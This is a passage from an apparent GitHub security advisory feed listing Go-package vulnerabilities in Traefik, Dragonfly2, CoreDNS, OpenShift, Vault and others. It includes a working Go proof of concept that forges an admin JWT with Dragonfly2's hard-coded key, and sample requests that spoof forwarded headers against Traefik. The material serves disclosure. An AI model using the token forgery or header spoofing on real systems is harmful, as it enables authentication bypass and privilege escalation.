User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X_Forwarded_Host: myhost
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 3</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:54:48 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 544

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
X_forwarded_host: myhost
</code></pre>
<p>Some backend frameworks (e.g. Django) handle X-Forwarded-Host and X_forwarded_host in the same way. As there is no X-Forwarded-Host header present in the request, the X_forwarded_host header will be used. </p>
<p>It should be noted that when X-Forwarded-Host is present and a X_forwarded_host header is sent, usually the first occurence of the header will be used, which is in this case X-Forwarded-Host.</p>
<p>It should be noted that the headers X-Forwarded-Tls-Client-Cert and X-Forwarded-Tls-Client-Cert-Info are also affected. Here, client certificate authentication would need to be enabled in the Traefik setup.</p>
<h3 id="impact-1">Impact</h3>
<p>All applications that trust the custom headers set by Traefik are affected by this vulnerability. As an example, assume that a backend application trusts Traefik to validate client certificates and trusts therefore the values that are sent within the X-Forwarded-Tls-Client-Cert header, but does not validate the certificate anew.</p>
<p>If the header is removed via the vulnerability, and the application framework allows for alternative names (e.g. by transforming the headers to lower case, and "-" to "_"), an attacker can place his own X_Forwarded_TLS_Client_Cert header in the request. This could lead to privilege escalation, as the attacker may put an (invalid) certificate in this header that would just be accepted by the application, but may contain other data than the certificate that is presented to Traefik for Client Certificate Authentication.</p>
<p>Moreover, if the backend application uses any of the other custom headers for security-sensitive operations, the removal or modification of these headers may also security implications (e.g. access control bypass).</p>
<p>The severity is the same as for <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server, i.e. 9.8 Critical.</p>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv">https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv</a></li>
<li><a href="https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f">https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">https://github.com/advisories/GHSA-62c8-mh53-4cqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62c8-mh53-4cqv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-19T14:48:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[d7y.io/dragonfly/v2] Dragonfly2 has hard coded cyptographic key]]></title>
        <id>https://github.com/advisories/GHSA-hpc8-7wpm-889w</id>
        <link href="https://github.com/advisories/GHSA-hpc8-7wpm-889w"/>
        <updated>2024-09-19T14:47:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Hello dragonfly maintainer team, I would like to report a security issue concerning your JWT feature. </p>
<h3 id="details">Details</h3>
<p>Dragonfly uses  <a href="https://github.com/dragonflyoss/Dragonfly2/blob/cddcac7e3bdb010811e2b62b3c71d9d5c6749011/manager/middlewares/jwt.go">JWT</a> to verify user. However, the secret key for JWT, "Secret Key", is hard coded, which leads to authentication bypass</p>
<pre><code class="language-go">authMiddleware, err := jwt.New(&amp;jwt.GinJWTMiddleware{
        Realm:       "Dragonfly",
        Key:         []byte("Secret Key"),
        Timeout:     2 * 24 * time.Hour,
        MaxRefresh:  2 * 24 * time.Hour,
        IdentityKey: identityKey,

        IdentityHandler: func(c *gin.Context) any {
            claims := jwt.ExtractClaims(c)

            id, ok := claims[identityKey]
            if !ok {
                c.JSON(http.StatusUnauthorized, gin.H{
                    "message": "Unavailable token: require user id",
                })
                c.Abort()
                return nil
            }

            c.Set("id", id)
            return id
        })
</code></pre>
<h3 id="poc">PoC</h3>
<p>Use code below to generate a jwt token</p>
<pre><code class="language-go">package main

import (
    "errors"
    "fmt"
    "time"

    "github.com/golang-jwt/jwt/v4"
)

func (stc *DragonflyTokenClaims) Valid() error {
    // Verify expiry.
    if stc.ExpiresAt &lt;= time.Now().UTC().Unix() {
        vErr := new(jwt.ValidationError)
        vErr.Inner = errors.New("Token is expired")
        vErr.Errors |= jwt.ValidationErrorExpired
        return vErr
    }
    return nil
}

type DragonflyTokenClaims struct {
    Id        int32 `json:"id,omitempty"`
    ExpiresAt int64 `json:"exp,omitempty"`
    Issue     int64 `json:"orig_iat,omitempty"`
}

func main() {
    signingKey := "Secret Key"
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, &amp;DragonflyTokenClaims{
        ExpiresAt: time.Now().Add(time.Hour).Unix(),
        Id:        1,
        Issue:     time.Now().Unix(),
    })
    signedToken, _ := token.SignedString([]byte(signingKey))
    fmt.Println(signedToken)
}
</code></pre>
<p>And send request with JWT above , you can still get data without restriction.
<img src="https://user-images.githubusercontent.com/70683161/224255896-8604fa70-5846-4fa0-b1f9-db264c5865fe.png" alt="image" width="1241"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can perform any action as a user with admin privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dragonflyoss/Dragonfly2/security/advisories/GHSA-hpc8-7wpm-889w">https://github.com/dragonflyoss/Dragonfly2/security/advisories/GHSA-hpc8-7wpm-889w</a></li>
<li><a href="https://github.com/dragonflyoss/Dragonfly2/commit/e9da69dc4048bf2a18a671be94616d85e3429433">https://github.com/dragonflyoss/Dragonfly2/commit/e9da69dc4048bf2a18a671be94616d85e3429433</a></li>
<li><a href="https://github.com/advisories/GHSA-hpc8-7wpm-889w">https://github.com/advisories/GHSA-hpc8-7wpm-889w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpc8-7wpm-889w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-19T14:47:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS Cache Poisoning via a birthday attack]]></title>
        <id>https://github.com/advisories/GHSA-h92q-fgpp-qhrq</id>
        <link href="https://github.com/advisories/GHSA-h92q-fgpp-qhrq"/>
        <updated>2024-09-18T22:50:14.000Z</updated>
        <content type="html"><![CDATA[<p>CoreDNS through 1.10.1 enables attackers to achieve DNS cache poisoning and inject fake responses via a birthday attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30464">https://nvd.nist.gov/vuln/detail/CVE-2023-30464</a></li>
<li><a href="https://gist.github.com/idealeer/e41c7fb3b661d4262d0b6f21e12168ba">https://gist.github.com/idealeer/e41c7fb3b661d4262d0b6f21e12168ba</a></li>
<li><a href="https://github.com/advisories/GHSA-h92q-fgpp-qhrq">https://github.com/advisories/GHSA-h92q-fgpp-qhrq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h92q-fgpp-qhrq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-18T21:30:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/chaosblade-io/chaosblade] Chaosblade vulnerable to OS command execution]]></title>
        <id>https://github.com/advisories/GHSA-723h-x37g-f8qm</id>
        <link href="https://github.com/advisories/GHSA-723h-x37g-f8qm"/>
        <updated>2024-09-18T22:40:21.000Z</updated>
        <content type="html"><![CDATA[<p>exec.CommandContext in Chaosblade 0.3 through 1.7.3, when server mode is used, allows OS command execution via the cmd parameter without authentication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47105">https://nvd.nist.gov/vuln/detail/CVE-2023-47105</a></li>
<li><a href="https://github.com/chaosblade-io/chaosblade/blob/0a07380c9899febb2b544132783b376b44226cca/exec/os/executor.go#L68">https://github.com/chaosblade-io/chaosblade/blob/0a07380c9899febb2b544132783b376b44226cca/exec/os/executor.go#L68</a></li>
<li><a href="https://narrow-oatmeal-0c0.notion.site/ChaosBlade-Remote-Command-Execution-CVE-2023-47105-4f5459046488436caaec2bced6ff26d7">https://narrow-oatmeal-0c0.notion.site/ChaosBlade-Remote-Command-Execution-CVE-2023-47105-4f5459046488436caaec2bced6ff26d7</a></li>
<li><a href="https://github.com/chaosblade-io/chaosblade/commit/6bc73c31e14ea2b1bfc30f359e1fe952859d9adc">https://github.com/chaosblade-io/chaosblade/commit/6bc73c31e14ea2b1bfc30f359e1fe952859d9adc</a></li>
<li><a href="https://github.com/advisories/GHSA-723h-x37g-f8qm">https://github.com/advisories/GHSA-723h-x37g-f8qm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-723h-x37g-f8qm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-18T18:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authzed/spicedb] SpiceDB having multiple caveats on resources of the same type may improperly result in no permission]]></title>
        <id>https://github.com/advisories/GHSA-jhg6-6qrx-38mr</id>
        <link href="https://github.com/advisories/GHSA-jhg6-6qrx-38mr"/>
        <updated>2024-09-18T19:26:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="background">Background</h2>
<p>Multiple caveats over the same indirect subject type on the same relation can result in no permission being returned when permission is expected</p>
<p>For example, given this schema:</p>
<pre><code>definition user {}

caveat somecaveat(somefield int) {
  somefield == 42
}

definition group {
  relation member: user
}

definition resource {
  relation viewer: group#member with somecaveat
  permission view = folder-&gt;view
}
</code></pre>
<p>If the resource has multiple groups, and each group is caveated, it is possible for the returned permission to be "no permission" when permission is expected.</p>
<h2 id="impact">Impact</h2>
<p>Permission is returned as NO_PERMISSION when PERMISSION is expected on the CheckPermission API.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Do not use caveats or do not use caveats on an indirect subject type with multiple entries</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authzed/spicedb/security/advisories/GHSA-jhg6-6qrx-38mr">https://github.com/authzed/spicedb/security/advisories/GHSA-jhg6-6qrx-38mr</a></li>
<li><a href="https://github.com/authzed/spicedb/commit/20855de75812bcbc975efebe7f76abf47c0f3edb">https://github.com/authzed/spicedb/commit/20855de75812bcbc975efebe7f76abf47c0f3edb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46989">https://nvd.nist.gov/vuln/detail/CVE-2024-46989</a></li>
<li><a href="https://github.com/authzed/spicedb/commit/d4ef8e1dbce1eafaf25847f4c0f09738820f5bf2">https://github.com/authzed/spicedb/commit/d4ef8e1dbce1eafaf25847f4c0f09738820f5bf2</a></li>
<li><a href="https://github.com/advisories/GHSA-jhg6-6qrx-38mr">https://github.com/advisories/GHSA-jhg6-6qrx-38mr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhg6-6qrx-38mr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-18T17:42:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS vulnerable to TuDoor Attacks]]></title>
        <id>https://github.com/advisories/GHSA-hfmw-7g3m-gj6q</id>
        <link href="https://github.com/advisories/GHSA-hfmw-7g3m-gj6q"/>
        <updated>2024-09-18T17:38:51.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in CoreDNS through 1.10.1. There is a vulnerability in DNS resolving software, which triggers a resolver to ignore valid responses, thus causing denial of service for normal resolution. In an exploit, the attacker could just forge a response targeting the source port of a vulnerable resolver without the need to guess the correct TXID.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28452">https://nvd.nist.gov/vuln/detail/CVE-2023-28452</a></li>
<li><a href="https://coredns.io">https://coredns.io</a></li>
<li><a href="https://gist.github.com/idealeer/e41c7fb3b661d4262d0b6f21e12168ba">https://gist.github.com/idealeer/e41c7fb3b661d4262d0b6f21e12168ba</a></li>
<li><a href="https://github.com/coredns/coredns/commit/604a902e2c7e0317aecaa3666124079c75a31573">https://github.com/coredns/coredns/commit/604a902e2c7e0317aecaa3666124079c75a31573</a></li>
<li><a href="https://github.com/advisories/GHSA-hfmw-7g3m-gj6q">https://github.com/advisories/GHSA-hfmw-7g3m-gj6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfmw-7g3m-gj6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/builder] OpenShift Builder has a path traversal, allows command injection in privileged BuildContainer]]></title>
        <id>https://github.com/advisories/GHSA-qqv8-ph7f-h3f7</id>
        <link href="https://github.com/advisories/GHSA-qqv8-ph7f-h3f7"/>
        <updated>2024-09-19T09:37:06.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in openshift/builder. This vulnerability allows command injection via path traversal, where a malicious user can execute arbitrary commands on the OpenShift node running the builder container. When using the "Docker" strategy, executable files inside the privileged build container can be overridden using the <code>spec.source.secrets.secret.destinationDir</code> attribute of the <code>BuildConfig</code> definition. An attacker running code in a privileged container could escalate their permissions on the node running the container.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7387">https://nvd.nist.gov/vuln/detail/CVE-2024-7387</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-7387">https://access.redhat.com/security/cve/CVE-2024-7387</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2302259">https://bugzilla.redhat.com/show_bug.cgi?id=2302259</a></li>
<li><a href="https://github.com/openshift/builder/commit/0b62633adfa2836465202bc851885e078ec888d1">https://github.com/openshift/builder/commit/0b62633adfa2836465202bc851885e078ec888d1</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3129">https://pkg.go.dev/vuln/GO-2024-3129</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6691">https://access.redhat.com/errata/RHSA-2024:6691</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6687">https://access.redhat.com/errata/RHSA-2024:6687</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6689">https://access.redhat.com/errata/RHSA-2024:6689</a></li>
<li><a href="https://github.com/advisories/GHSA-qqv8-ph7f-h3f7">https://github.com/advisories/GHSA-qqv8-ph7f-h3f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qqv8-ph7f-h3f7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-17T00:31:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openshift/openshift-controller-manager] OpenShift Controller Manager Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-j8gh-87rx-c7w9</id>
        <link href="https://github.com/advisories/GHSA-j8gh-87rx-c7w9"/>
        <updated>2024-09-19T09:36:03.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in OpenShift. This issue occurs due to the misuse of elevated privileges in the OpenShift Container Platform's build process. During the build initialization step, the git-clone container is run with a privileged security context, allowing unrestricted access to the node. An attacker with developer-level access can provide a crafted .gitconfig file containing commands executed during the cloning process, leading to arbitrary command execution on the worker node. An attacker running code in a privileged container could escalate their permissions on the node running the container.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45496">https://nvd.nist.gov/vuln/detail/CVE-2024-45496</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-45496">https://access.redhat.com/security/cve/CVE-2024-45496</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2308661">https://bugzilla.redhat.com/show_bug.cgi?id=2308661</a></li>
<li><a href="https://github.com/openshift/openshift-controller-manager/commit/3af3628103f9ddc3b825e6e5243ec58e85311046">https://github.com/openshift/openshift-controller-manager/commit/3af3628103f9ddc3b825e6e5243ec58e85311046</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3128">https://pkg.go.dev/vuln/GO-2024-3128</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6691">https://access.redhat.com/errata/RHSA-2024:6691</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6687">https://access.redhat.com/errata/RHSA-2024:6687</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:6689">https://access.redhat.com/errata/RHSA-2024:6689</a></li>
<li><a href="https://github.com/advisories/GHSA-j8gh-87rx-c7w9">https://github.com/advisories/GHSA-j8gh-87rx-c7w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8gh-87rx-c7w9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-17T00:31:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Arbitrary File Read]]></title>
        <id>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</id>
        <link href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx"/>
        <updated>2024-09-16T17:33:28.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana &lt;= 6.4.3 has an Arbitrary File Read vulnerability, which could be exploited by an authenticated attacker that has privileges to modify the data source configurations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19499">https://nvd.nist.gov/vuln/detail/CVE-2019-19499</a></li>
<li><a href="https://github.com/grafana/grafana/pull/20192">https://github.com/grafana/grafana/pull/20192</a></li>
<li><a href="https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06">https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06</a></li>
<li><a href="https://github.com/grafana/grafana/commit/19dbd27c5caa1a160bd5854b65a4e1fe2a8a4f00">https://github.com/grafana/grafana/commit/19dbd27c5caa1a160bd5854b65a4e1fe2a8a4f00</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200918-0003">https://security.netapp.com/advisory/ntap-20200918-0003</a></li>
<li><a href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx">https://github.com/advisories/GHSA-4pwp-cx67-5cpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T23:11:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-m979-w9wj-qfj9</id>
        <link href="https://github.com/advisories/GHSA-m979-w9wj-qfj9"/>
        <updated>2024-09-16T17:23:48.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.9.0 through 1.3.3 may, under certain circumstances, have an Entity's Group membership inadvertently include Groups the Entity no longer has permissions to. Fixed in 1.3.4.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10660">https://nvd.nist.gov/vuln/detail/CVE-2020-10660</a></li>
<li><a href="https://github.com/hashicorp/vault/pull/8606">https://github.com/hashicorp/vault/pull/8606</a></li>
<li><a href="https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a">https://github.com/hashicorp/vault/commit/18485ee9d4352ac8e8396c580b5941ccf8e5b31a</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#134-march-19th-2020</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault">https://www.hashicorp.com/blog/category/vault</a></li>
<li><a href="https://github.com/advisories/GHSA-m979-w9wj-qfj9">https://github.com/advisories/GHSA-m979-w9wj-qfj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m979-w9wj-qfj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T23:40:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-09-16T17:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault">https://www.hashicorp.com/blog/category/vault</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-09-16T17:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault">https://www.hashicorp.com/blog/category/vault</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-09-16T17:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault">https://www.hashicorp.com/blog/category/vault</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault Authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</id>
        <link href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf"/>
        <updated>2024-09-16T17:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise versions 0.8.3 and newer, when configured with the GCP GCE auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16251">https://nvd.nist.gov/vuln/detail/CVE-2020-16251</a></li>
<li><a href="https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151">https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151</a></li>
<li><a href="http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html">http://packetstormsecurity.com/files/159479/Hashicorp-Vault-GCP-IAM-Integration-Authentication-Bypass.html</a></li>
<li><a href="https://www.hashicorp.com/blog/category/vault">https://www.hashicorp.com/blog/category/vault</a></li>
<li><a href="https://github.com/advisories/GHSA-4mp7-2m29-gqxf">https://github.com/advisories/GHSA-4mp7-2m29-gqxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mp7-2m29-gqxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-31T00:21:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT's state syncing validator from malicious node may lead to a chain split]]></title>
        <id>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</id>
        <link href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"/>
        <updated>2024-09-16T16:13:43.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split
<strong>Component</strong>: CometBFT
<strong>Criticality</strong>: Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>: I:Moderate; L: Possible)
<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>
<h3 id="summary">Summary</h3>
<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>
<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>
